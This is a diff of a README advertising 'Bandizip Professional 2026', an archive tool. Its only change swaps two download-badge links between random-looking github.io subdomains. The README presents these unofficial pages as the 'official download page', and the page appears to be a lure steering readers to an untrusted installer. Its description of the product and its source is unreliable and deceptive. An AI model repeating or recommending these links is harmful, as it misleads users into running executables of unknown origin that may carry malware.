@@ -2,7 +2,7 @@
 
 Bandizip Professional is a comprehensive archive management tool designed for Windows users. This 2026 edition offers enhanced features for efficient file compression and encryption, making it ideal for both personal and professional use. Whether you're handling large files or need secure archiving, Bandizip Professional provides reliable performance.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -56,7 +56,7 @@ A4: Yes, the portable version allows you to run Bandizip Professional directly f
 
 To get the latest version of Bandizip Professional 2026, visit the official download page:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ## License
 
